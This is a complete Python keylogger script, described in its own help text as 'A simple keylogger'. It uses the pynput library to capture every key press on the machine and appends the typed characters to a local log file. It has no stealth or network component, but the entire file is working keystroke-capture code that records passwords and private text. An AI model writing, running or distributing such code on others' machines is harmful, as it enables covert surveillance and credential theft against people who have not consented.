from pynput.keyboard import Listener
import argparse
import os

# Default log file path
DEFAULT_LOG_FILE = "log.txt"



def writeToFile(key, log_file):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    elif letter == 'Key.enter':
        letter = '\n'
    elif letter == 'Key.backspace':
        letter = '[BACKSPACE]'
    elif letter.startswith('Key.'):
        # Ignore other special keys
        return

    with open(log_file, 'a') as f:
        f.write(letter)

def main():
    parser = argparse.ArgumentParser(description="A simple keylogger")
    parser.add_argument('--log-file', type=str, default=DEFAULT_LOG_FILE, help="The file to log keystrokes to")
    args = parser.parse_args()

    log_file = args.log_file

    # Ensure the log file exists
    if not os.path.exists(log_file):
        print(f"Creating log file: {log_file}")
        open(log_file, 'w').close()

    print(f"Logging keystrokes to {log_file}")

    def on_press(key):
        try:
            writeToFile(key, log_file)
        except Exception as e:
            print(f"Error: {e}")

    try:
        # Setup the listener
        with Listener(on_press=on_press) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

if __name__ == "__main__":
    main()